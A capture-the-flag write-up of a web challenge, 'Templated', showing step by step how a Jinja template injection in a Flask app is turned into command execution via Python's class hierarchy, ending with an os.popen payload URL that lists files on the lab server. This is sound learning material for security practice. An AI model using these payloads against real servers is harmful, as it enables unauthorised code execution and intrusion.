---
authors:
    - Lukas Daubner
date: 16-01-2024
---

# Web: Templated

The web says that it uses Jinja and Python So we try to inject stuff to the template

## Jinja injection

### Test

`http://46.101.23.188:32368/{{1+1}}` That returns `2` so we can execute things on server.

### Python classes

The challange is to work our way truough python objects See: https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti We climb the python class hiearchy up and down

`http://46.101.23.188:32368/{{"".__class__.__mro__[1]}} ` Gets us object class

`http://46.101.23.188:32368/{{"".__class__.__mro__[1].__subclasses__()}} ` Gets us subclasses accessable from object

### RCE

we need to find `__import__` function somewhere. We look on the classes on their subsets

**warnings.catch_warnings** at offset 186 has it. So we access it like this: `http://46.101.23.188:32368/{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]}}`

With the import, we can import `os` module, to execute command on server

`http://46.101.23.188:32368/{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls *").read()}}`

Find and read the flag